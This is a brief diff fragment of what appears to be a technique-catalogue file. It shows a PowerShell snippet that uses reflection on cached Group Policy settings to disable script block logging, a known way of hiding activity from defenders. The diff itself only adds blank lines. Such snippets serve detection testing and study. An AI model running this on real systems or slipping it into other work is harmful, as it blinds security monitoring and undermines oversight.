@@ -16,3 +16,5 @@ updated_at: '2023-04-10T20:36:17.635356+00:00'
 ```bash
 $settings = [Ref].Assembly.GetType(\"System.Management.Automation.Utils\").GetField(\"cachedGroupPolicySettings\",\"NonPublic,Static\").GetValue($null);\n$settings[\"HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptBlockLogging\"] = @{}\n$settings[\"HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptBlockLogging\"].Add(\"EnableScriptBlockLogging\", \"0\")
 ```
+
+
